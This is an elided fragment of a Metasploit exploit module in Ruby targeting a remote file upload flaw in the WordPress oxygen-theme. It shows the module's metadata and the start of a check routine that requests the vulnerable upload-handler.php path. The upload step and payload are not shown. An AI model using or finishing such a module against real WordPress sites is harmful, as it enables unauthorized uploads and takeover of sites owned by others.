...
class Metasploit3 < Msf::Exploit::Remote
    ...
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'WordPress oxygen-theme Themes Remote File Upload Vulnerability',
            'Description'    => %q{
                    This module exploits a vulnerability found in Wp oxygen-theme By abusing the upload-handler.php file,
    ...
    def check
        ...
        res = send_request_cgi({
            'method' => 'GET',
            'uri'    => "#{uri}wp-content/themes/oxygen-theme/functions/upload-handler.php"
        })
